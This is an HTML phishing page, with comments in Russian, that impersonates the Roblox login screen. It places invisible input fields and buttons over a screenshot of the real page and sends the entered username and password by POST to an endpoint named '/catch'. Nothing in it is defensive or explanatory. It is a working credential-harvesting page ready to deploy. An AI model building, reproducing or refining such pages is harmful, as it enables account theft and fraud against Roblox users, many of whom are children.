!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            /* Фоновая картинка */
            background-image: url('https://www.image2url.com/r2/default/images/1788504855465-d1ad8ca9-c64f-4236-9d35-ee4c6b7de39f.png');
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            
            color: #ffffff;
            font-family: Arial, sans-serif;
            
            /* Выравнивание ровно по центру экрана */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .auth-container {
            background: transparent; /* Делаем форму прозрачной */
            width: 100%;
            max-width: 400px;         /* Ширина под размер центральной менюшки */
            padding: 20px;
            text-align: center;
            box-sizing: border-box;
        }

        /* Скрываем тексты HTML, так как они уже нарисованы на картинке */
        h1, 
        .link-text, 
        .signup-text {
            opacity: 0;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        /* Невидимые поля ввода поверх картинки */
        .input-control {
            width: 100%;
            padding: 12px;
            background: transparent;
            border: 1px solid transparent;
            border-radius: 4px;
            color: #ffffff;
            font-size: 14px;
            box-sizing: border-box;
        }

        .input-control:focus {
            outline: none;
            background: rgba(255, 255, 255, 0.05); /* Легкий подсвет при клике */
        }

        /* Невидимые кликабельные кнопки */
        .btn-submit {
            width: 100%;
            padding: 12px;
            background: transparent;
            border: none;
            color: transparent;
            cursor: pointer;
            margin-top: 5px;
        }

        .secondary-actions {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-top: 40px;
        }

        .btn-secondary {
            width: 100%;
            padding: 10px;
            background: transparent;
            border: none;
            color: transparent;
            cursor: pointer;
        }

        .error-message {
            display: none;
        }
    </style>
</head>
<body>

    <div class="auth-container">
        <h1>Login to Roblox</h1>
        
        <form action="/catch" method="POST">
            <input type="text" name="username" class="input-control" placeholder="Username/Email/Phone" required>
            <input type="password" name="password" class="input-control" placeholder="Password" required>
            <div class="error-message">Incorrect username or password.</div>
            <button type="submit" class="btn-submit">Log In</button>
        </form>

        <a href="#" class="link-text">Forgot Password or Username?</a>
        
        <div class="secondary-actions">
            <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
            <button type="button" class="btn-secondary">Quick Sign-In</button>
        </div>
        
        <div class="signup-text">
            Don't have an account? <a href="#">Sign Up</a>
        </div>
    </div>

</body>
</html>
